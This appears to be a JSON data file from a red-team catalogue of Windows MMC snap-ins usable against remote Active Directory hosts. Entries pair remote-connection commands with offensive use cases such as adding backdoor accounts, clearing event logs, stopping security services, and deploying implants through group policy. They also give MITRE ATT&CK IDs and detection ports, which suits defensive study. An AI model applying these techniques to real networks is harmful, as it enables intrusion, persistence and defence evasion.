"Type":"MMC","Name":"azman.msc","Description":"Authorization Manager","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"azman.msc","Description":"Authorization Manager","Usecases":null,"Function":"Manage","Comments":["Right click root node -> Open Authorization Store -> Active Directory or Active Directory Application Mode (ADAM) -> Browse"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"389/UDP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/azman/"},{
"Type":"MMC","Name":"certlm.msc","Description":"Certificates - Local Computer","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"certlm.msc","Description":"Certificates - Local Computer","Usecases":["Export private keys (if marked as exportable)","Install malicious trusted root certificates"],"Function":"Manage","Comments":["Right click -> Connect to another computer -> Enter the object name to select -> `DC1.ad.bitsadmin.com`","Quite slow when used over SOCKS"],"MitreAttack":["T1553.004"]}],"Resources":null,"Detections":[{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/certlm/"},{
"Type":"MMC","Name":"certmgr.msc","Description":"Certificates - Current User","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"certmgr.msc","Description":"Certificates - Current User","Usecases":null,"Function":"Manage","Comments":["Does not seem possible to use this snap-in remotely"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/certmgr/"},{
"Type":"MMC","Name":"certsrv.msc","Description":"Certificate Authority","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"certsrv.msc /COMPUTER:CASUB1.AD.BITSADMIN.COM","Description":"Certificate Authority","Usecases":["Approve certificate requests"],"Function":"Manage","Comments":["Alternatively in the GUI, right click root node -> Retarget Certification Authority -> Another Computer: `CASUB1.ad.bitsadmin.com`","Note that the Certificate Templates section returns error `Template information could not be loaded: The specified domain either does not exist or could not be contacted`"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/certsrv/"},{
"Type":"MMC","Name":"certtmpl.msc","Description":"Certificate Templates","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"certtmpl.msc","Description":"Certificate Templates","Usecases":["Create new vulnerable templates and enroll for those as authentication backdoor"],"Function":"Manage","Comments":["Right click root node -> Connect to another writable domain controller -> Change -> `ad.bitsadmin.com` -> OK","Requires OffensiveDC"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"389/UDP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/certtmpl/"},{
"Type":"MMC","Name":"comexp.msc","Description":"Component Services","Updated":"2024-04-19","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"comexp.msc","Description":"Component Services","Usecases":["Privesc: manipulate settings of COM objects so it runs with higher privileges","Modify ACLs to create a backdoor on the system"],"Function":"Manage","Comments":["Component Services -> Computers -> Right click -> New -> Computer -> Browse -> `DC1.ad.bitsadmin.com`","Does not work from OffensiveDC","Alternative way to launch: `dcomcnfg.exe`"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/comexp/"},{
"Type":"MMC","Name":"compmgmt.msc","Description":"Computer Management","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"compmgmt.msc /computer:DC1.ad.bitsadmin.com","Description":"Computer Management","Usecases":null,"Function":"Manage","Comments":["Includes: [taskschd.msc](../taskschd), [eventvwr.msc](../eventvwr), [fsmgmt.msc](../fsmgmt), [lusrmgr.msc](../lusrmgr), [perfmon.msc](../perfmon), [devmgmt.msc](../devmgmt), [diskmgmt.msc](../diskmgmt), [services.msc](../services) and [WmiMgmt.msc](../WmiMgmt)","Alternatively in the GUI, right click root node -> Connect to another computer -> `DC1.ad.bitsadmin.com`","Alternative way to launch: `CompMgmtLauncher.exe`"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"445/TCP"},{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/compmgmt/"},{
"Type":"MMC","Name":"devmgmt.msc","Description":"Device Manager","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"compmgmt.msc","Description":"Device Manager","Usecases":null,"Function":"Manage","Comments":["See [compmgmt.msc](../compmgmt) how to use it against a remote host. Returns errors though when connecting, so does not seem to work"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/devmgmt/"},{
"Type":"MMC","Name":"dfsmgmt.msc","Description":"DFS Management","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"dfsmgmt.msc","Description":"DFS Management","Usecases":null,"Function":"Data","Comments":["Right click root node -> Add Namespaces to Display or Add Replication Groups to Display"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"389/UDP"},{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/dfsmgmt/"},{
"Type":"MMC","Name":"dhcpmgmt.msc","Description":"DHCP","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"dhcpmgmt.msc /ComputerName DC1.ad.bitsadmin.com","Description":"DHCP","Usecases":null,"Function":"Manage","Comments":["Alternatively, in GUI right click root node -> Add server"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/dhcpmgmt/"},{
"Type":"MMC","Name":"diskmgmt.msc","Description":"Disk Management","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"compmgmt.msc","Description":"Disk Management","Usecases":null,"Function":"Manage","Comments":["See [compmgmt.msc](../compmgmt) how to use it against a remote host. Returns errors though when connecting, so does not seem to work."],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"445/TCP"},{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/diskmgmt/"},{
"Type":"MMC","Name":"dnsmgmt.msc","Description":"DNS Manager","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"dnsmgmt.msc /ComputerName DC1.ad.bitsadmin.com","Description":"DNS Manager","Usecases":["Modify/create DNS record for internal phishing website"],"Function":"Manage","Comments":["Alternatively, in GUI right click root node -> Connect to DNS Server"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/dnsmgmt/"},{
"Type":"MMC","Name":"domain.msc","Description":"Active Directory Domains and Trusts","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"domain.msc /server=DC1.ad.bitsadmin.com","Description":"Active Directory Domains and Trusts","Usecases":["Perform reconnaissance on domain trusts"],"Function":"Domain","Comments":["Will initially show some errors because the offensive Windows host is not part of a domain","Right click the Active Directory Domains and Trusts node in the list of snap-ins and choose Change Forest or Change Domain. Now enter the FQDN of the root domain and click OK"],"MitreAttack":["T1484.002"]}],"Resources":null,"Detections":[{"Port":"389/TCP"},{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/domain/"},{
"Type":"MMC","Name":"dsa.msc","Description":"Active Directory Users and Computers","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"dsa.msc /server=DC1.ad.bitsadmin.com","Description":"Active Directory Users and Computers","Usecases":["Perform reconnaissance on users, groups and computers in the domain","Add backdoor user or computer account","Modify group membership","View user's BitLocker recovery passwords"],"Function":"Domain","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"389/TCP"},{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/dsa/"},{
"Type":"MMC","Name":"dssite.msc","Description":"Active Directory Sites and Services","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"dssite.msc /domain=AD.BITSADMIN.COM","Description":"Manage domain","Usecases":["Collect information about sites and IP subnets"],"Function":"Domain","Comments":["Does not work from the OffensiveDC, use `/server` parameter instead"],"MitreAttack":null},{"Command":"dssite.msc /server=DC1.ad.bitsadmin.com","Description":"Manage specific server","Usecases":["Collect information about sites and IP subnets"],"Function":"Domain","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"389/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/dssite/"},{
"Type":"MMC","Name":"eventvwr.msc","Description":"Event Viewer","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"eventvwr.exe DC1.ad.bitsadmin.com","Description":"Event Viewer","Usecases":["Clear the Security event log","Disable certain logs (Right click -> Disable Log)","Identify source IPs from which certain users have logged in to chase after their workstations","Configure the Security log to not overwrite events so it will just stop logging"],"Function":"Logs","Comments":["Alternatively, use [compmgmt.msc](../compmgmt) or launch the snap-in, right click the root node -> Connect to Another Computer"],"MitreAttack":["T1070.001","T1562.002"]},{"Command":"eventvwr.msc /computer:DC1.ad.bitsadmin.com","Description":"Event Viewer","Usecases":["Clear the Security event log","Disable certain logs (Right click -> Disable Log)","Identify source IPs from which certain users have logged in to chase after their workstations","Configure the Security log to not overwrite events so it will just stop logging"],"Function":"Logs","Comments":["Alternatively, use [compmgmt.msc](../compmgmt) or launch the snap-in, right click the root node -> Connect to Another Computer"],"MitreAttack":["T1070.001","T1562.002"]}],"Resources":null,"Detections":[{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/eventvwr/"},{
"Type":"MMC","Name":"fsmgmt.msc","Description":"Shared Folders","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"fsmgmt.msc /computer:W10.ad.bitsadmin.com","Description":"Shared Folders","Usecases":["View which users are connected to the share from which computername","View which files are opened by which users","Add (hidden - dollar share) shared folder"],"Function":"Manage","Comments":["Alternatively, use [compmgmt.msc](../compmgmt)"],"MitreAttack":["T1135","T1021.002"]}],"Resources":null,"Detections":[{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/fsmgmt/"},{
"Type":"MMC","Name":"fsrm.msc","Description":"File Server Resource Manager","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"fsrm.msc","Description":"File Server Resource Manager","Usecases":null,"Function":"Manage","Comments":["Right click File Server Resource Manager -> Connect to Another Computer -> Another computer: `DC1.ad.bitsadmin.com`"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"445/TCP"},{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/fsrm/"},{
"Type":"MMC","Name":"fxsadmin.msc","Description":"Fax Service Manager","Updated":"2023-07-01","Toolsets":["GUI","Server"],"Commands":[{"Command":"fxsadmin.msc","Description":"Fax Service Manager","Usecases":null,"Function":"Manage","Comments":["`mmc.exe` -> File -> Add/Remove Snap-In -> Fax Service Manager -> Add -> Another computer: `DC1.ad.bitsadmin.com` -> Finish -> OK"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/fxsadmin/"},{
"Type":"MMC","Name":"gpedit.msc","Description":"Local Group Policy Editor","Updated":"2024-12-13","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"gpedit.msc /gpcomputer: DC1.ad.bitsadmin.com","Description":"Local Group Policy Editor for a computer","Usecases":["Add evil startup script","Weaken security as a backdoor","Open ports in the firewall"],"Function":"Manage","Comments":["Quotes around the hostname or in case of no quotes a space before the hostname seem to be required","Through SMB edits files in `\\\\DC1.ad.bitsadmin.com\\ADMIN$\\GroupPolicy` (= `%SystemRoot%\\System32\\GroupPolicy`)"],"MitreAttack":null},{"Command":"gpedit.msc /gpobject:\"LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=ad,DC=bitsadmin,DC=com\"","Description":"Local Group Policy Editor for a computer","Usecases":["Execute immediate scheduled tasks on machines to launch implant"],"Function":"Domain","Comments":["Example edits Default Domain Policy, change GUID for editing other policies","Through SMB edits files in `\\\\ad.bitsadmin.com\\SYSVOL\\{GUID}` (= `%SystemRoot%\\Sysvol\\sysvol\\ad.bitsadmin.com` by default) on the DC"],"MitreAttack":["T1037.003","T1484.001"]}],"Resources":null,"Detections":[{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/gpedit/"},{
"Type":"MMC","Name":"gpmc.msc","Description":"Group Policy Management","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"gpmc.msc /domain:ad.bitsadmin.com","Description":"Group Policy Management","Usecases":["Create and link a malicious group policy to systems","Force the update of group policy on all machines in an OU"],"Function":"Domain","Comments":["For remote domains, this needs to be executed from OffensiveDC. Also use the `/domain` parameter in the commandline. In View -> Options -> General, uncheck the \"Enable trust detection\" checkbox. Next, right click the root node -> Add forest"],"MitreAttack":["T1037.003","T1484.001"]}],"Resources":null,"Detections":[{"Port":"389/UDP"},{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/gpmc/"},{
"Type":"MMC","Name":"gpme.msc","Description":"Group Policy Management Editor","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"gpme.msc /gpobject:\"LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=ad,DC=bitsadmin,DC=com\"","Description":"Group Policy Management Editor","Usecases":["Execute immediate scheduled tasks on machines to launch implant"],"Function":"Domain","Comments":["Only possible from OffensiveDC","Commandline launches editor for the GUID of the default domain policy; can be changed to other GUIDs to edit different policies"],"MitreAttack":["T1053.005"]}],"Resources":null,"Detections":[{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/gpme/"},{
"Type":"MMC","Name":"gptedit.msc","Description":"Group Policy Starter GPO Editor","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"gptedit.msc /s /gtmpobject:\"\\\\DC1.ad.bitsadmin.com\\sysvol\\ad.bitsadmin.com\\StarterGPOs\\{DE3EB8C2-A808-4509-9D89-D383F950AEDB}\\\"","Description":"Group Policy Starter GPO Editor","Usecases":null,"Function":"Domain","Comments":["Edit Group Policy Starter GPO directly based on the path"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/gptedit/"},{
"Type":"MMC","Name":"iis.msc","Description":"Internet Information Services (IIS) Manager","Updated":"2023-07-01","Toolsets":["GUI"],"Commands":[{"Command":"iis.msc","Description":"Internet Information Services (IIS) Manager","Usecases":["Create virtual directory with web shell (drop shell over SMB or maybe create virtual directory on share)","Add FTP site to be able to browse the filesystem","Weaken authentication","Add MIME Types to be able to download certain file extensions"],"Function":"Manage","Comments":["Right click Start Page -> Connect to a Server -> Server name: `SP2019.ad.bitsadmin.com` -> Next -> Enter User name/password -> Next -> Connection Name: `SP2019` -> Finish","Requires to install and enabled Remote IIS Management service","Does not seem possible to perform authentication transparently through Kerberos","Can also be launched via `inetmgr.exe`"],"MitreAttack":null}],"Resources":["https://woshub.com/remote-iis-management-in-windows-server-2012/"],"Detections":[{"Port":"8172/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/iis/"},{
"Type":"MMC","Name":"iis6.msc","Description":"Internet Information Services (IIS) 6.0 Manager","Updated":"2023-07-01","Toolsets":["GUI"],"Commands":[{"Command":"iis6.msc","Description":"Internet Information Services (IIS) 6.0 Manager","Usecases":null,"Function":"Manage","Comments":["Right click -> Connect -> Computer name: `DC1.ad.bitsadmin.com` -> OK"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/iis6/"},{
"Type":"MMC","Name":"ipsecsnp.dll","Description":"IP Security Policy Management","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"mmc.exe","Description":"IP Security Policy Management for a computer","Usecases":["Weaken IPSec requirements"],"Function":"Manage","Comments":["Open via MMC's Add/Remove Snap-In -> IP Security Policy Management -> Another Active Directory domain: `DC1.ad.bitsadmin.com` -> Finish -> OK"],"MitreAttack":null},{"Command":"mmc.exe","Description":"IP Security Policy Management for domain","Usecases":["Weaken IPSec requirements"],"Function":"Manage","Comments":["Open via MMC's Add/Remove Snap-In -> IP Security Policy Management -> Another Active Directory domain: `ad.bitsadmin.com` -> Finish -> OK"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"389/UDP"},{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/ipsecsnp/"},{
"Type":"MMC","Name":"ipsmsnap.dll","Description":"IP Security Monitor","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"mmc.exe","Description":"IP Security Monitor","Usecases":null,"Function":"Manage","Comments":["Open via MMC's Add/Remove Snap-ins, then right click the root node -> Add Computer -> The following computer: `DC1.ad.bitsadmin.com` -> OK","IPSec service needs to be running on the remote host"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/ipsmsnap/"},{
"Type":"MMC","Name":"lsdiag.msc","Description":"Remote Desktop Licensing Diagnoser","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"lsdiag.msc","Description":"Remote Desktop Licensing Diagnoser","Usecases":null,"Function":"Manage","Comments":["Right click root node -> Connect to Remote Desktop Session Host Server -> Another computer: `DC1.ad.bitsadmin.com` -> OK"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"445/TCP"},{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/lsdiag/"},{
"Type":"MMC","Name":"lusrmgr.msc","Description":"Local Users and Groups","Updated":"2023-11-04","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"lusrmgr.msc /computer=W10.ad.bitsadmin.com","Description":"Local Users and Groups","Usecases":["Add a backdoor user","Change password of existing user","Enable and disable accounts","Add users to, and remove users from groups","Configure backdoor logon script"],"Function":"Manage","Comments":["Alternative is to use [compmgmt.msc](../compmgmt)","Through this snap-in it does not seem possible to add a user to a local group on the remote machine. Through [compmgmt.msc](../compmgmt) this _does_ work well though"],"MitreAttack":["T1531","T1136.001","T1078.003"]}],"Resources":null,"Detections":[{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/lusrmgr/"},{
"Type":"MMC","Name":"nfsmgmt.msc","Description":"Services for NFS","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"nfsmgmt.msc","Description":"Services for NFS","Usecases":null,"Function":"Manage","Comments":["Right click on root node -> Connect to another computer -> Another computer: `DC1.ad.bitsadmin.com` -> OK"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"5985/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/nfsmgmt/"},{
"Type":"MMC","Name":"nps.msc","Description":"Network Policy Server","Updated":"2023-07-01","Toolsets":["GUI","Server"],"Commands":[{"Command":"nps.msc /computer:DC1.ad.bitsadmin.com","Description":"Network Policy Server","Usecases":null,"Function":"Manage","Comments":["Alternative: mmc.exe -> Add or Remove Snap-ins -> Network Policy Server -> Add -> Another computer -> `DC1.ad.bitsadmin.com` -> OK"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/nps/"},{
"Type":"MMC","Name":"ocsp.msc","Description":"Online Responder Management","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"ocsp.msc /Computer:DC1.ad.bitsadmin.com","Description":"Online Responder Management","Usecases":null,"Function":"Manage","Comments":["Alternative via GUI: Right click Online Responder -> Retarget Responder -> Another computer: `DC1.ad.bitsadmin.com` -> OK"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/ocsp/"},{
"Type":"MMC","Name":"perfmon.msc","Description":"Performance Monitor","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"perfmon.msc","Description":"Performance Monitor","Usecases":null,"Function":"Manage","Comments":["Action -> Connect to another computer -> Another computer: `DC1.ad.bitsadmin.com` -> OK","Requires \"Remote Registry\" service to be running on the remote host"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/perfmon/"},{
"Type":"MMC","Name":"pkiview.msc","Description":"Enterprise PKI","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"pkiview.msc","Description":"Enterprise PKI","Usecases":null,"Function":"Manage","Comments":["Does not seem possible to use this snap-in remotely"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/pkiview/"},{
"Type":"MMC","Name":"printmanagement.msc","Description":"Print Management","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"printmanagement.msc","Description":"Print Management","Usecases":["Install a malicious printer driver?"],"Function":"Manage","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"445/TCP"},{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/printmanagement/"},{
"Type":"MMC","Name":"remoteprograms.msc","Description":"RemoteApp Manager","Updated":"2023-07-01","Toolsets":["GUI","Server"],"Commands":[{"Command":"remoteprograms.msc","Description":"RemoteApp Manager","Usecases":null,"Function":"Manage","Comments":["Seems to be deprecated, nowadays management of remote apps seems to be done through [ServerManager.exe](../../Binaries/ServerManager)"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/remoteprograms/"},{
"Type":"MMC","Name":"rrasmgmt.msc","Description":"Routing and Remote Access","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"rrasmgmt.msc /ComputerName DC1.ad.bitsadmin.com","Description":"Routing and Remote Access","Usecases":["Port mirror all traffic to us?"],"Function":"Manage","Comments":["Alternative: Right click Routing and Remote Access -> Add Server -> The following computer: `DC1.ad.bitsadmin.com` -> OK"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"135/TCP"},{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/rrasmgmt/"},{
"Type":"MMC","Name":"rsop.msc","Description":"Resultant Set of Policy","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"rsop.msc","Description":"Resultant Set of Policy","Usecases":["Perform reconnaissance on applied (security) policies on remote system"],"Function":"Domain","Comments":["Right click RSoP -> Change Query -> Another computer: `DC1.ad.bitsadmin.com` -> Next -> Next -> Next -> Finish"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/rsop/"},{
"Type":"MMC","Name":"schmmgmt.dll","Description":"Active Directory Schema","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"mmc.exe","Description":"Active Directory Schema","Usecases":null,"Function":"Domain","Comments":["Open via MMC's Add/Remove Snap-in, then right click the root node -> Change Active Directory Domain Controller"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"389/UDP"},{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/schmmgmt/"},{
"Type":"MMC","Name":"secpol.msc","Description":"Local Security Policy","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"gpedit.msc","Description":"Local Security Policy","Usecases":null,"Function":"Manage","Comments":["Remotely just use [gpedit.msc](../gpedit)","Direct link to gpedit.msc -> Computer Configuration -> Windows Settings -> Security Settings"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/secpol/"},{
"Type":"MMC","Name":"services.msc","Description":"Services","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"services.msc /computer:DC1.ad.bitsadmin.com","Description":"Services","Usecases":["Identify security solutions running on the endpoint","Stop/disable security services"],"Function":"Manage","Comments":["Quite slow to collect information on all services through SOCKS, performs 4 requests (Open/Query/something/Close) for every service. Better use [sc.exe](../../Binaries/sc) in case the name of the service is known"],"MitreAttack":["T1569.002"]}],"Resources":null,"Detections":[{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/services/"},{
"Type":"MMC","Name":"tapimgmt.msc","Description":"Telephony","Updated":"2023-07-01","Toolsets":["GUI","Server"],"Commands":[{"Command":"tapimgmt.msc","Description":"Telephony","Usecases":null,"Function":"Manage","Comments":["Right click -> Add computer -> Another computer: `DC1.ad.bitsadmin.com` -> OK"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/tapimgmt/"},{
"Type":"MMC","Name":"taskschd.msc","Description":"Task Scheduler","Updated":"2023-11-04","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"taskschd.msc","Description":"Task Scheduler","Usecases":["Create backdoor for persistence: Advantage, an EDR will have a hard time to connect the persistence to the implant/backdoor that is running the SOCKS server"],"Function":"Execute","Comments":["Right click -> Connect to Another Computer","Alternatively, use [compmgmt.msc](../compmgmt)"],"MitreAttack":["T1053.005"]}],"Resources":null,"Detections":[{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/taskschd/"},{
"Type":"MMC","Name":"tpm.msc","Description":"Trusted Platform Module (TPM) Management","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"mmc.exe","Description":"Trusted Platform Module (TPM) Management","Usecases":["Wipe the TPM to impact availability; only the Bitlocker Recovery Key will then help to recover the data"],"Function":"Manage","Comments":["Add or Remove Snap-ins -> TPM Management -> Add -> Another computer: `W11.ad.bitsadmin.com` -> OK"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/tpm/"},{
"Type":"MMC","Name":"tsadmin.msc","Description":"Remote Desktop Services Manager","Updated":"2023-07-01","Toolsets":["GUI","Server"],"Commands":[{"Command":"tsadmin.msc","Description":"Remote Desktop Services Manager","Usecases":null,"Function":"Manage","Comments":["Removed in Server 2012+. Copy `tsadmin.msc` and related files from Windows Server 2008 R2"],"MitreAttack":null}],"Resources":["https://woshub.com/how-to-run-tsadmin-msc-and-tsconfig-msc-snap-ins-on-windows-server-2012-rds/"],"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/tsadmin/"},{
